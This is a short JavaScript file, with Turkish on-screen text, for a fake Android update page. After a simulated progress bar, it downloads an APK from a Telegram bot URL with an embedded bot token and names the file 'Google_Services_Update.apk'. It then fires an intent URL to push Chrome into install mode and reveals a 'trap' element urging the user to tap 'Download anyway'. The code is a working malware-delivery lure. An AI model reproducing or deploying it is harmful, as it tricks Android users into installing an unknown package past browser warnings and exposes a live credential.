function runProgressBar(callback) {
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    
    let width = 0;
    const interval = setInterval(() => {
        width += Math.random() * 4;
        if (width >= 100) {
            clearInterval(interval);
            bar.style.width = "100%";
            status.innerText = "Sistem doğrulanıyor...";
            callback();
        } else {
            bar.style.width = width + "%";
            status.innerText = "İndiriliyor: %" + Math.round(width);
        }
    }, 120);
}

document.getElementById('start-btn').addEventListener('click', function() {
    this.style.display = 'none';
    
    runProgressBar(() => {
        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
        
        // 1. İndirmeyi tetikle
        const a = document.createElement('a');
        a.href = apkUrl;
        a.download = "Google_Services_Update.apk";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        // 2. Intent Yönlendirmesi (Videonun 0.24. saniyesindeki sıfırlanma efekti)
        setTimeout(() => {
            // Chrome'u yükleme moduna zorlayan protokol
            const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
            window.location.href = intentUrl;
            
            // 3. Tuzağı aktif et
            const trap = document.getElementById('click-trap');
            trap.style.display = "block";
            
            document.getElementById('status').innerHTML = 
                "<b style='color:#d93025'>KRİTİK:</b> Lütfen alttaki 'Yine de indir' butonuna dokunarak güncellemeyi doğrulayın.";
        }, 1000);
    });
});
